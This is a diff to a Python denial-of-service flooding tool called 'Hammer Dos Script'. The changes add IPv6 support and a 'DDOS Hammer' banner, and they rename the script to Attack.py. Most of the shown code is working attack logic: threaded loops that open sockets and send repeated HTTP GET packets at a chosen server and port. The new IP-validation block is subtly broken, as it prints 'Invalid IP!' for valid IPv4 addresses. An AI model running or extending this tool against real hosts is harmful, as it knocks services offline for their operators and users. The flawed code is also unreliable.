@@ -1,14 +1,10 @@
-#!/usr/bin/python3
-# -*- coding: utf-8 -*-
-
 # python 3.3.2+ Hammer Dos Script v.1
-# by Can Yalçın
 # only for legal purpose
-
 
 from queue import Queue
 from optparse import OptionParser
-import time,sys,socket,threading,logging,urllib.request,random
+import pyfiglet
+import time,sys,socket,threading,logging,urllib.request,random,ipaddress
 
 def user_agent():
 	global uagent
@@ -41,11 +37,14 @@ def bot_hammering(url):
 		time.sleep(.1)
 
 
-def down_it(item):
+def down_it(item, ):
 	try:
 		while True:
 			packet = str("GET / HTTP/1.1\nHost: "+host+"\n\n User-Agent: "+random.choice(uagent)+"\n"+data).encode('utf-8')
-			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			if ip4:
+				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			else:
+				s = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
 			s.connect((host,int(port)))
 			if s.sendto( packet, (host, int(port)) ):
 				s.shutdown(1)
@@ -75,10 +74,11 @@ def dos2():
 
 
 def usage():
-	print (''' \033[92m	Hammer Dos Script v.1 http://www.canyalcin.com/
+	intro = pyfiglet.figlet_format("DDOS Hammer", font = "standard")	
+	print (intro, ''' \033[92m	Hammer Dos Script v.1 http://www.canyalcin.com/
 	It is the end user's responsibility to obey all applicable laws.
 	It is just for server testing script. Your ip is visible. \n
-	usage : python3 hammer.py [-s] [-p] [-t]
+	usage : python3 Attack.py [-s] [-p] [-t]
 	-h : help
 	-s : server ip
 	-p : port default 80
@@ -123,7 +123,8 @@ headers.close()
 #task queue are q,w
 q = Queue()
 w = Queue()
-
+# Ip version
+ip4 = True
 
 if __name__ == '__main__':
 	if len(sys.argv) < 2:
@@ -135,7 +136,17 @@ if __name__ == '__main__':
 	my_bots()
 	time.sleep(5)
 	try:
-		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		# Check if it's either a ipv4, a ipv6 or a invalid IP!
+		try:
+			ipaddress.ip_address(host) == ipaddress.IPv4Address(host)
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		except:
+			ipaddress.ip_address(host) == ipaddress.IPv6Address(host)
+			s = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
+			ip4 = False
+		else:
+			print('\033[91mInvalid IP!\nPlease try another one!')
+
 		s.connect((host,int(port)))
 		s.settimeout(1)
 	except socket.error as e:
